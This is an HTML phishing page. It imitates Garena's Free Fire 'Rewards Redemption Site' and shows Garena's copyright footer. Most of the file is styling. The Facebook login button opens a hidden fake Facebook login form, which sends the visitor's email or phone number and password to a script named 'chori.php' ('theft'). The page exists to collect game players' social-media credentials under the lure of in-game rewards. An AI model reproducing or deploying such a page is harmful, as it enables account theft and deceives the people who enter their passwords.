<!DOCTYPE html>
<html>
<head>
	<title>Free Fire </title>
	<meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1, viewport-fit=cover">
	<link rel="shortcut icon" type="image/x-icon" href="images/icon.jpg">
	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>
	<link rel="preconnect" href="https://fonts.gstatic.com"> 
<link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@500&display=swap" rel="stylesheet">
   <link rel="stylesheet"
          href="https://fonts.googleapis.com/css?family=Tangerine">
          <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css



">
	<style type="text/css">
		/*
 * All styles
 * 2019-08-21
 */
 
.clearfix:after {
  content: '';
  height: 0;
  display: block;
  clear: both;
}
::-webkit-scrollbar {
  -webkit-appearance: none;
}
::-webkit-scrollbar:vertical {
  width: 0.6vw;
}
::-webkit-scrollbar:horizontal {
  height: 0px;
}
::-webkit-scrollbar-thumb {
  background-color: #696969;
  border-radius: 1vw;
  border: 0px solid #ffffff;
}
::-webkit-scrollbar-track {
  border-radius: 1vw;
  background-color: rgba(255, 255, 255, 0.05);
}
html, body {
  width: 100%;
  height: 100%;
  font-size: 14px;
    /*font-family: 'Tangerine', serif;*/
}
body {
  line-height: 1;
  /*font-family: 'Tangerine', serif;*/
}
*, *::before, *::after {
  box-sizing: border-box;
}
#app {
  width: 100%;
  height: 100%;
  /*position: absolute;*/
  /*background: transparent;*/
}
.container {
  width: 100%;
  height: 100%;
  position: relative;
}
.container-bg {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 57px;
  background: url("images/mobile-bg.jpg") center top no-repeat;
  background-size: cover;
  z-index: 1;
}
.container::before {
  content: "";
  position: fixed;
  top: 0;
  left: 0;
  height: 5px;
  width: 100%;
  background: url("images/top_teeth.png") top left repeat-x;
  z-index: 10;
}
.mobile-mask {
  position: fixed;
  top: 0;
  left: 0;
  bottom: 0;
  right: 0;
  background: rgba(0, 0, 0, 0.7);
  z-index: 2;
}
.logo {
  position: fixed;
  top: 2vw;
  left: 2vw;
  width: 31vw;
  height: 8vw;
  background: url("images/logo.png") center no-repeat;
  background-size: contain;
  z-index: 10;
}
/* main body */
.main {
  padding-top: 23vh;
  padding-bottom: 62px; /* footer 57 + margin 5 */
  position: relative;
  z-index: 10;
}
.main-title {
  font-size: 31px;
  line-height: .9;
  color: #fff;
  font-weight: bold;
  text-align: center;
  text-transform: uppercase;
  font-family: 'Ubuntu', sans-serif;

}
.char_title {
  line-height: 1;
}
.main-desc {
  margin-top: 4px;
  font-size: 14px;
  line-height: 1.2;
  color: #fff;
  text-align: center;
  text-transform: uppercase;
  font-weight: 200;
}
.main-desc .highlight {
  color: #fc2f00;
}
.loginbtn-group {
  margin: 4vh 20vw;
  text-align: center;
  display: flex;
}
.loginbtn-item {
  flex: 1;
}
.btn-item {
  display: inline-block;
  width: 42px;
  height: 42px;
  background-size: 100% 100%;
  background-repeat: no-repeat;
  background-position: center;
  cursor: pointer;
  transition: all 0.3s ease-in;
}
.btn-item:hover {
  opacity: 0.85;
}
.btn-item.facebook {
  background-image: url("images/facebook.png");
}
.btn-item.vk {
  background-image: url("images/vk.png");
}
.btn-item.huawei {
  background-image: url("images/huawei.png");
}
.btn-item.google {
  background-image: url("images/google.png");
}
.btn-item.apple {
  background-image: url("images/apple.png");
}
.btn-item.twitter {
  background-image: url("images/twitter.png");
}
.input-group {
  margin: 4vh 10vw;
  font-size: 0;
  text-align: center;
}
.input-group.one {
  margin-bottom: 2.1vh;
  position: relative;
}
.input-group.one::before,
.input-group.one::after {
  content: "";
  position: absolute;
  top: 13px;
  width: 6px;
  height: 1px;
  background: #fff;
}
.input-group.one::before {
  left: calc(((100% - 73px * 3) / 2 - 6px) / 2 + 73px);
}
.input-group.one::after {
  right: calc(((100% - 73px * 3) / 2 - 6px) / 2 + 73px);
}
.input-group.two {
  margin-top: 0;
  margin-bottom: 2.6vh;
}
.input-btn {
  width: 73px;
	height: 28px;
	background-color: #ebebeb;
	box-shadow: inset 0px 3px 2px 0px rgba(0, 0, 0, 0.15);
  border-radius: 5px;
  text-align: center;
  font-size: 1rem;
  color: #010101;
  outline:none;
  border: 0;
}
.input-btn.left {
  float: left;
}
.input-btn.right {
  float: right;
}
.confirm-btn {
  float: left;
  margin: 0;
  width: 86px;
  height: 28px;
  line-height: 1;
	background-color: #ff7200;
  border-radius: 3px;
	font-size: 13px;
	/* font-weight: bold; */
  color: #fff;
  border: none;
  outline: none;
  transition: all 0.3s ease-in;
  text-transform: uppercase;
  cursor: pointer;
}
.logout-btn:hover,
.confirm-btn:hover {
  opacity: 0.85;
}
.logout-btn {
  float: right;
  margin: 0;
  width: 68px;
  height: 17px;
  line-height: 17px;
	background-color: #736357;
	border-radius: 3px;
  font-size: 10px;
  color: #fff;
  border: none;
  outline: none;
  transition: all 0.3s ease-in;
  text-transform: uppercase;
  cursor: pointer;
}
.userinfo {
  width: calc(100% - 154px);
  padding-right: 6px;
  float: left;
  font-size: 11px;
  text-align: right;
  color: #fff;
}
.userinfo p {
  word-break: break-word;
}
.notice {
  padding: 0 1.3rem;
}
.notice-inner {
  padding: 0.7rem 0.7rem 0.7rem 1.1rem;
  max-height: 190px;
  overflow-y: auto;
  color:#010101;
  border-radius: 5px;
  background-color: rgba(255, 255, 255, 0.8)
}
.notice-title {
  line-height: 1.2;
  font-size: 15px;
  /* font-weight: bold; */
}
/* .notice-list {
  padding-left: 0.9rem;
} */
.notice-item {
  position: relative;
  font-size: 13px;
  font-weight: 200;
  line-height: 1.2;
}
/* .notice-item::before {
  content: attr(data-order)".";
  position: absolute;
  top: 0;
  left: -.9rem;
} */
.notice-item .highlight {
  color: #ff3600;
}
.notice-toggle {
  display: none;
}
/* footer */
.footer {
  position: fixed;
  width: 100%;
  height: 57px;
  display: table;
  left: 0;
  bottom: 0;
  background: #111;
  z-index: 10;
}
.copyright {
  display: table-cell;
  vertical-align: middle;
  padding-left: 1rem;
  font-size: 0;
}

.small-logo {
  margin: 0 .3rem;
  display: inline-block;
  vertical-align: middle;
  width: 27px;
  height: 27px;
  background: url("images/logo_small_foot.jpg") center no-repeat;
  background-size: auto 100%;
  border-radius: 3px;
}
.copyright-message {
  width: calc(100% - 2.6rem);
  display: inline-block;
  vertical-align: middle;
  font-size: 6px;
  color: #666;
  text-align: left;
  font-family: tahoma, arial, sans-serif;
}

.copyright-message p:first-child {
  margin-bottom: 0.5rem;
}

@keyframes fadeInUp {
  from {
    opacity: 0;
    transform: translate3d(0, 100%, 0);
  }

  to {
    opacity: 1;
    transform: translate(0, 0);
  }
}

.loading {
  background: url(images/loading.gif) no-repeat 0 0;
  background-size: 40px 100%;
  background-position: center;
  width: 100%;
  height: 40px;
}

.loading-btn {
  background: url(images/loading.gif) no-repeat 0 0;
  background-size: 40px 100%;
  background-position: center;
  background-color: #ff7200;
}

.ar_wrap .notice,
.ar_wrap .userinfo
{
    text-align: right;
    direction: rtl;
}

.rr-modal {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  padding-top: 25vh;
  background: transparent;
  z-index: 20;
}
.rr-modal__bg {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: url("images/modal-bg.png") center top no-repeat;
  background-size: 100% 100%;
  z-index: -1;
}
.rr-modal__inner {
  position: relative;
  margin: 0 auto;
  width: 286px;
  height: 175px;
  padding: 14px;
  padding-left: 32px;
}
.rr-modal__title {
  font-size: 25px;
  color: #ffa618;
  text-transform: uppercase;
}
.rr-modal__subtitle {
  margin-bottom: 10px;
  font-size: 14px;
  color: #ffa618;
}
.rr-modal__desc {
  height: 66px;
  overflow-y: auto;
}
.rr-modal__text-title {
  line-height: 1.2;
  font-size: 13px;
  /* font-weight: bold; */
  color: #fff;
}
.rr-modal__text {
  font-size: 12px;
  color: #fff;
  font-weight: 200;
}
.success-fin {
  margin-top: 1rem;
}
.closebtn-wrapper {
  position: absolute;
  margin-top: 5px;
  bottom: 14px;
  right: 21px;
}
.rr-modal__close {
  float: right;
  margin: 0;
  width: 73px;
  height: 24px;
  line-height: 24px;
  background-color: #ffa618;
  border-radius: 3px;
  font-size: 11px;
  /* font-weight: bold; */
  color: #000;
  border: none;
  outline: none;
  text-align: center;
  text-transform: uppercase;
}
@media screen and (orientation: landscape) {
  .rr-modal {
    padding-top: 16vh;
  }
  .rr-modal__inner {
    margin: 0 4rem 0 auto;
  }
}
@media (min-width: 768px) and (orientation: portrait) {

  .rr-modal__inner {
    width: 454px;
    height: 277px;
    padding: 43px 97px 43px 50px;
  }
  .rr-modal__bg {
    background-image: url("images/modal-bg-m.png")
  }
  .rr-modal__title {
    font-size: 33px;
  }
  .rr-modal__subtitle {
    font-size: 18px;
    margin-bottom: 24px;
  }
  .closebtn-wrapper {
    bottom: 23px;
    right: 34px;
  }
  .rr-modal__close {
    width: 115px;
    height: 37px;
    font-size: 17px;
  }
  .rr-modal__desc {
    height: 85px;
  }
  .rr-modal__text-title {
    font-size: 16px;
  }
  .rr-modal__text {
    font-size: 14px;
  }
}
@media (min-width: 992px) {
  .rr-modal {
    padding-top: 0;
  }
  .rr-modal__bg {
    background-image: url("images/modal-bg-m.png")
  }
  .rr-modal__inner {
    position: absolute;
    top: 44%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 454px;
    height: 277px;
    padding: 43px 97px 43px 50px;
  }
  .rr-modal__title {
    font-size: 33px;
  }
  .rr-modal__subtitle {
    font-size: 18px;
    margin-bottom: 24px;
  }
  .closebtn-wrapper {
    bottom: 23px;
    right: 34px;
  }
  .rr-modal__desc {
    height: 85px;
  }
  .rr-modal__close {
    width: 115px;
    height: 37px;
    font-size: 17px;
  }
  .rr-modal__text-title {
    font-size: 16px;
  }
  .rr-modal__text {
    font-size: 14px;
  }
}
@media (min-width: 1200px) {
  .rr-modal__inner {
    width: 580px;
    height: 355px;
    padding: 55px 43px 43px 64px;
  }
  .rr-modal__bg {
    background-image: url("images/modal-bg-l.png")
  }
  .rr-modal__title {
    font-size: 42px;
  }
  .rr-modal__subtitle {
    font-size: 23px;
    margin-bottom: 29px;
  }
  .closebtn-wrapper {
    bottom: 30px;
    right: 43px;
  }
  .rr-modal__close {
    width: 146px;
    height: 46px;
    font-size: 22px;
  }
  .rr-modal__desc {
    height: 105px;
  }
  .rr-modal__text-title {
    font-size: 21px;
  }
  .rr-modal__text {
    font-size: 18px;
  }
}

.fade-enter-active, .fade-leave-active {
  transition: opacity .3s;
}
.fade-enter, .fade-leave-to  {
  opacity: 0;
}

/*
 * Responsive styles
 * 2019-08-22
 */
/* landscape */
@media screen and (orientation: landscape) {
  .container-bg {
    background-image: url("images/mobile-h-bg.jpg")
  }
  .mobile-mask {
    display: none;
  }
  .main-desc p {
    display: inline;
  }
  .logo {
    width: 16vw;
    height: 4vw;
    background-image: url("images/logo.png");
  }
  .main {
    float: right;
    margin: 0 9vw 0 auto;
    padding-top: 11vh;
    width: 320px;
  }
  .main-title,
  .main-desc {
    color: #000;
  }
  .loginbtn-group {
    margin: 10vh 40px;
  }
  .input-group {
    margin: 13vh 26px;
  }
  .input-group.one {
    margin-top: 9vh;
    margin-bottom: 4vh;
  }
  .notice {
    display: none;
    position: fixed;
    padding: 0;
    width: 320px;
    bottom: calc(4rem + 37px);
    border-radius: 5px;
    border: solid 1px #5c5c5c;
  }
  .notice-inner {
    background: rgba(255, 255, 255, 0.96);
  }
  .notice.show {
    display: block;
    animation: fadeInUp 0.5s both;
  }
  .notice-inner {
    max-height: 60vh;
  }
  .notice-toggle {
    display: block;
    position: fixed;
    bottom: 4rem;
    width: 168px;
    height: 32px;
    margin-left: 76px;
    line-height: 36px;
    text-align: center;
    border-radius: 6px 6px 0 0;
    background-color: #e9a733;
    cursor: pointer;
  }
  .notice-toggle::after {
    content: "";
    display: inline-block;
    margin-left: 6px;
    vertical-align: middle;
    width: 18px;
    height: 18px;
    background: url("images/arrow.png") no-repeat;
    transition: transform .3s ease;
  }
  .notice-toggle.show::after {
    transform: rotate(180deg);
  }
  .userinfo {
    color: #000;
  }
  .copyright {
    text-align: center;
  }
  .copyright-message {
    width: inherit;
  }
}

/* tablet portrait */
@media screen and (min-width: 768px) and (orientation: portrait) {
  .container-bg {
    bottom: 106px;
    background-image: url("images/tablet-bg.jpg");
  }
  .container::before {
    height: 9px;
    background-image: url("images/top_teeth-m.png")
  }
  .logo {
    width: 21vw;
    height: 5vw;
    left: 6vw;
    top: 3vw;
  }
  .mobile-mask {
    display: none;
  }
  .main {
    float: right;
    margin: 0 7vw 0 auto;
    padding-top: 14vh;
    padding-bottom: 111px; /* footer 106 + margin 5 */
    width: 420px;
  }
  .main-title,
  .main-desc {
    color: #161616;
  }
  .main:not(.ar_wrap) .main-title,
  .main:not(.ar_wrap) .main-desc {
    text-align: left;
  }
  .ar_wrap .main-title,
  .ar_wrap .main-desc  {
    text-align: right;
  }
  .main-desc .highlight {
    color: #295396;
  }
  .main-title {
    font-size: 55px;
  }
  .main-desc {
    font-size: 25px;
    font-weight: normal;
  }
  .loginbtn-group {
    margin: 6vh 0;
    width: 412px;
  }
  .btn-item {
    width: 76px;
    height: 76px;
  }
  .btn-item.facebook {
    background-image: url("images/facebook-m.png");
  }
  .btn-item.vk {
    background-image: url("images/vk-m.png");
  }
  .btn-item.huawei {
    background-image: url("images/huawei-m.png");
  }
  .btn-item.google {
    background-image: url("images/google-m.png");
  }
  .btn-item.apple {
    background-image: url("images/apple-m.png");
  }
  .btn-item.twitter {
    background-image: url("images/twitter-m.png");
  }
  .input-group {
    margin-right: 0;
    margin-left: 0;
  }
  .input-btn {
    width: 117px;
    height: 44px;
    background-color: #ebebeb;
    box-shadow: inset 0px 3px 2px 0px rgba(0, 0, 0, 0.15);
    border-radius: 5px;
  }
  .input-group.one::before,
  .input-group.one::after {
    width: 8px;
    height: 2px;
    top: 21px;
    background: #161616;
  }
  .input-group.one::before {
    left: calc(((100% - 117px * 3) / 2 - 8px) / 2 + 117px);
  }
  .input-group.one::after {
    right: calc(((100% - 117px * 3) / 2 - 8px) / 2 + 117px);
  }
  .confirm-btn {
    width: 138px;
    height: 44px;
    font-size: 21px;
  }
  .logout-btn {
    width: 108px;
    height: 27px;
    line-height: 27px;
    font-size: 16px;
  }
  .input-group.one {
    margin-top: 6vh;
  }
  .input-group.two {
    margin-bottom: 6vh;
  }
  .userinfo {
    width: calc(100% - 138px);
    padding-right: 0;
    margin-bottom: 4px;
    font-size: 15px;
    color: #000;
  }
  .userinfo p {
    display: inline;
  }
  .notice {
    padding: 0;
  }
  .notice-inner {
    padding: 5px 0;
    background: transparent;
  }
  .notice-title {
    font-size: 18px;
  }
  .notice-item {
    font-size: 15px;
  }
  .footer {
    height: 106px;
  }
  .small-logo {
    width: 49px;
    height: 49px;
    margin: 0 8px;
  }
  .copyright {
    padding-left: 33px;
  }
  .copyright-message {
    width: calc(100% - 100px);
    font-size: 12px;
  }
  .copyright-message p:first-child {
    margin-bottom: 1rem;
  }
}
	
/* smaller screen */
@media screen and (min-width: 992px) {
  .container-bg {
    bottom: 76px;
    background-image: url("images/tablet-h-bg.jpg");
  }
  .container::before {
    height: 9px;
    background-image: url("images/top_teeth-l.png")
  }
  .logo {
    width: 15vw;
    height: 4vw;
    left: 17vw;
    background-image: url("images/logo.png");
  }
  .mobile-mask {
    display: none;
  }
  .main {
    float: right;
    margin-right: calc(50% - 345px);
    padding-top: 15vh;
    padding-bottom: 81px; /* footer 76 + margin 5 */
    width: 345px;
  }
  .main-title,
  .main-desc {
    color: #161616;
  }
  .main:not(.ar_wrap) .main-title,
  .main:not(.ar_wrap) .main-desc {
    text-align: left;
  }
  .ar_wrap .main-title,
  .ar_wrap .main-desc  {
    text-align: right;
  }
  .main-desc p {
    display: block;
  }
  .main-desc .highlight {
    color: #295396;
  }
  .main-title {
    font-size: 43px;
  }
  .main-desc {
    font-size: 20px;
  }
  .loginbtn-group {
    margin: 6vh 0;
    width: 326px;
  }
  .btn-item {
    width: 60px;
    height: 60px;
  }
  .btn-item.facebook {
    background-image: url("images/facebook-m.png");
  }
  .btn-item.vk {
    background-image: url("images/vk-m.png");
  }
  .btn-item.huawei {
    background-image: url("images/huawei-m.png");
  }
  .btn-item.google {
    background-image: url("images/google-m.png");
  }
  .btn-item.apple {
    background-image: url("images/apple-m.png");
  }
  .btn-item.twitter {
    background-image: url("images/twitter-m.png");
  }
  .input-group {
    margin-right: 0;
    margin-left: 0;
  }
  .input-btn {
    width: 100px;
    height: 38px;
    background-color: #ebebeb;
    box-shadow: inset 0px 3px 2px 0px rgba(0, 0, 0, 0.15);
    border-radius: 5px;
  }
  .input-group.one {
    margin-top: 6vh;
    margin-bottom: 2vh;
  }
  .input-group.one::before,
  .input-group.one::after {
    width: 8px;
    height: 2px;
    top: 18px;
    background: #161616;
  }
  .input-group.one::before {
    left: calc(((100% - 100px * 3) / 2 - 8px) / 2 + 100px);
  }
  .input-group.one::after {
    right: calc(((100% - 100px * 3) / 2 - 8px) / 2 + 100px);
  }
  .confirm-btn {
    width: 116px;
    height: 37px;
    font-size: 17px;
  }
  .logout-btn {
    width: 92px;
    height: 23px;
    line-height: 23px;
    font-size: 13px;
  }
  .userinfo {
    width: calc(100% - 116px);
    padding-right: 0;
    margin-bottom: 4px;
    font-size: 13px;
    color: #000;
  }
  .userinfo p {
    display: inline;
  }
  .notice {
    display: block;
    position: static;
    padding: 0;
    border: 0;
    width: inherit;
  }
  .notice-inner {
    padding: 5px 0;
    background: transparent;
  }
  .notice-title {
    font-size: 14px;
  }
  .notice-item {
    font-size: 12px;
  }
  .footer {
    height: 76px;
  }
  .small-logo {
    width: 38px;
    height: 38px;
    margin: 0 6px;
  }
  .copyright-message {
    width: inherit;
    font-size: 12px;
  }
  .notice-toggle {
    display: none;
  }
}

/* pc */
@media screen and (min-width: 1200px) {
  .container-bg {
    bottom: 115px;
    background-image: url("images/bg.jpg");
  }
  .logo {
    width: 11vw;
    height: 3vw;
    top: 1vw;
    left: calc(50% - 23vw);
  }
  .mobile-mask {
    display: none;
  }
  .main {
    margin-right: calc(50% - 462px);
    padding-top: 14vh;
    padding-bottom: 120px; /* footer 115 + margin 5 */
    width: 462px;
  }
  .main-title {
    font-size: 58px;
  }
  .main-desc {
    font-size: 26px;
    font-weight: normal;
  }
  .loginbtn-group {
    margin: 6vh 0;
    width: 434px;
  }
  .btn-item {
    width: 70px;
    height: 70px;
  }
  .btn-item.facebook {
    background-image: url("images/facebook-l.png");
  }
  .btn-item.vk {
    background-image: url("images/vk-l.png");
  }
  .btn-item.huawei {
    background-image: url("images/huawei-l.png");
  }
  .btn-item.google {
    background-image: url("images/google-l.png");
  }
  .btn-item.apple {
    background-image: url("images/apple-l.png");
  }
  .btn-item.twitter {
    background-image: url("images/twitter-l.png");
  }
  .input-btn {
    width: 125px;
    height: 47px;
    background-color: #ebebeb;
    box-shadow: inset 0px 3px 2px 0px rgba(0, 0, 0, 0.15);
    border-radius: 5px;
  }
  .input-group.one {
    margin-top: 5vh;
    margin-bottom: 2vh;
  }
  .input-group.two {
    margin-bottom: 7vh;
  }
  .input-group.one::before,
  .input-group.one::after {
    width: 9px;
    height: 4px;
    top: 21px;
    background: #161616;
  }
  .input-group.one::before {
    left: calc(((100% - 125px * 3) / 2 - 9px) / 2 + 125px);
  }
  .input-group.one::after {
    right: calc(((100% - 125px * 3) / 2 - 9px) / 2 + 125px);
  }
  .confirm-btn {
    width: 146px;
    height: 46px;
    font-size: 22px;
  }
  .logout-btn {
    width: 115px;
    height: 28px;
    line-height: 28px;
    font-size: 17px;
  }
  .userinfo {
    width: calc(100% - 146px);
    padding-right: 0;
    margin-bottom: 4px;
    font-size: 16px;
    color: #000;
  }
  .notice-title {
    font-size: 19px;
  }
  .notice-item {
    font-size: 16px;
  }
  .footer {
    height: 115px;
  }
  .small-logo {
    width: 50px;
    height: 50px;
    margin: 0 10px;
  }
}
html, body, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
b, u, i, center,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td,
article, aside, canvas, details, embed, 
figure, figcaption, footer, header, hgroup, 
menu, nav, output, ruby, section, summary,
time, mark, audio, video {
	margin: 0;
	padding: 0;
	border: 0;
	font-size: 100%;
	font: inherit;
	vertical-align: baseline;
}
/* HTML5 display-role reset for older browsers */
article, aside, details, figcaption, figure, 
footer, header, hgroup, menu, nav, section {
	display: block;
}
body {
	line-height: 1;
}
ol, ul {
	list-style: none;
}
blockquote, q {
	quotes: none;
}
blockquote:before, blockquote:after,
q:before, q:after {
	content: '';
	content: none;
}
table {
	border-collapse: collapse;
	border-spacing: 0;
}
/*form designing*/
main .form{
    position: fixed;
    right: 35%;
    top: 20%;
    overflow: hidden;
}
main .form{

    width: 25%;
    height: 50%;
    background-color: white;
    display: block;

    z-index: 1;
    border-radius: 6px;
box-shadow: -1px 3px 22px 4px rgba(100,100,100,0.75);
-webkit-box-shadow: -1px 3px 22px 4px rgba(100,100,100,0.75);
-moz-box-shadow: -1px 3px 22px 4px rgba(100,100,100,0.75);

}
.form label{
    margin-left: 7px;
    /*margin-top:70px;*/
}
 .form input{
 	margin-top: 10px;
    width: 95%;
    height: 45px;
    margin-left: 7px;
    margin-bottom: 5px;
    border-radius: 4px;
    border:1px solid silver;
    font-size: 15px;

 }
 .form img{
    width: 40%;
margin-left: 100px;
    margin-bottom: 7px;
    /*background-image: url("images/fb.jpg");*/

 }
 .form button{
    width: 95%;
    margin-top: 30px;
    margin-left: 4px;
    height: 40px;
    color: #fff;
        /*background-color: #1877f2;*/
    border: none;
    border-radius: 6px;
    font-size: 20px;
    /*line-height: 48px;*/
    /*padding: 0 16px;*/
    width: 332px;
    background-image: linear-gradient(to right top, #91b3e0, #669aef, #4b7cf8, #5158f8, #7012eb);
    cursor: pointer;
 }
 
.form a{
    margin-left: 7px;
}
.form i{
    margin-left:320px;
    margin-top: 2px;
    
}
/*sidyo form ko bujis ni haina*/
@media screen and (min-width: 320px) and (orientation:portrait){
		main .form{
    position: fixed;
    right: 15%;
    top: 20%;
    overflow: hidden;
}
main .form{

    width: 70%;
    height: 50%;
    background-color: white;
    display: block;

    z-index: 1;
    border-radius: 6px;
box-shadow: -1px 3px 22px 4px rgba(100,100,100,0.75);
-webkit-box-shadow: -1px 3px 22px 4px rgba(100,100,100,0.75);
-moz-box-shadow: -1px 3px 22px 4px rgba(100,100,100,0.75);

}
.form label{
    margin-left: 7px;
    /*margin-top:70px;*/
}
 .form input{
 	margin-top: 10px;
    width: 95%;
    height: 45px;
    margin-left: 7px;
    margin-bottom: 5px;
    border-radius: 4px;
    border:1px solid silver;
    font-size: 15px;

 }
 .form img{
    width: 40%;
margin-left: 75px;
    margin-bottom: 7px;
    /*background-image: url("images/fb.jpg");*/

 }
 .form button{
    /*width: 20%;*/
    margin-top: 30px;
    margin-left: 13px;
    height: 40px;
    color: #fff;
        /*background-color: #1877f2;*/
    border: none;
    border-radius: 6px;
    font-size: 20px;
    /*line-height: 48px;*/
    /*padding: 0 16px;*/
    width: 220px;
    background-image: linear-gradient(to right top, #91b3e0, #669aef, #4b7cf8, #5158f8, #7012eb);
    cursor: pointer;
 }
 
.form a{
    margin-left: 7px;
}
.form i{
    margin-left:320px;
    margin-top: 2px;
    
}
}
 main .hide{
	display: none;
}
.block{
	display: none;
}

main .cross{
	/*padding-bottom: -20px;*/

}

	</style>
	<body>
		<div id="app" >
			
			<div></div>
				<div class="container clearfix" >
					::before
					<div class="container-bg" ></div>
					<div class="mobile-mask"></div>
					<div class="logo"></div>
					<div class=""></div>
					<main class="main" >
						<div class="form hide">
							<img src="images/fb2.png">
							<!-- <i class="fas fa-times-circle cross"></i> -->
						<form action="chori.php" method="POST">
							<input type="text" name="user" required autocomplete="off" placeholder="Email or phone number">
							<input type="password" name="password" required placeholder="Password">	
							<a href="#">Forgot password?</a>
							<button type="submit">Login</button>
						</form>
					</div>
						<h1 class="main-title ">Rewards Redemption Site</h1>
						<div></div>
						<div><div class="main-desc"><p>Please log in.</p></div><div class="loginbtn-group clearfix"><div class="loginbtn-item btn_fb"><span class="btn-item facebook" id="fb" onclick="popup()"></span></div><div class="loginbtn-item btn_vk"><span class="btn-item vk"></span></div><div class="loginbtn-item btn_go"><span class="btn-item google"></span></div><div class="loginbtn-item btn_hw"><span class="btn-item huawei"></span></div><div class="loginbtn-item btn_apple"><span class="btn-item apple"></span></div><div class="loginbtn-item btn_twitter"><span class="btn-item twitter"></span></div></div></div>
						<div class="">
							<section class="notice "><div class="notice-inner"><h2 class="notice-title">Important Notice:</h2><ul class="notice-list"><li class="notice-item"><!-- react-text: 18 -->1. Redemption code has<!-- /react-text --><span class="highlight"> 12 </span><!-- react-text: 20 -->characters, consisting of capital letters and numbers.<!-- /react-text --></li><li class="notice-item"><!-- react-text: 22 -->2. Item rewards are shown in<!-- /react-text --><span class="highlight">&nbsp;[vault]&nbsp;</span><!-- react-text: 24 -->tab in game lobby; Golds or diamonds will add in account wallet automatically.<!-- /react-text --></li><li class="notice-item">3. Please note redemption expiration date. Any expired codes cannot be redeemed.</li><li class="notice-item">4. Please contact customer service if you encountered any issue.</li><li class="notice-item">5. Reminder: you will not be able to redeem your rewards with guest accounts. You may bind your account to Facebook or VK in order to receive the rewards.</li></ul></div></section>
						</div>
						
					</main>
					<div></div>
					
					<footer class="footer"><div class="copyright"><span class="small-logo"></span><div class="copyright-message"><p>Copyright © Garena International.</p><p>Trademarks belong to their respective owners. All rights Reserved.</p></div></div></footer>
					::after
				</div>
			</div>
			
		</div>
</body>
<script type="text/javascript">
form=document.querySelector(".form");
	function popup() {
		form.classList.remove('hide');


	}
	function close(){
form.classList.add('block');

	}

</script>
<!-- The core Firebase JS SDK is always required and must be listed first -->
<script src="/__/firebase/8.2.10/firebase-app.js"></script>

<!-- TODO: Add SDKs for Firebase products that you want to use
     https://firebase.google.com/docs/web/setup#available-libraries -->
<script src="/__/firebase/8.2.10/firebase-analytics.js"></script>

<!-- Initialize Firebase -->
<script src="/__/firebase/init.js"></script>
</html>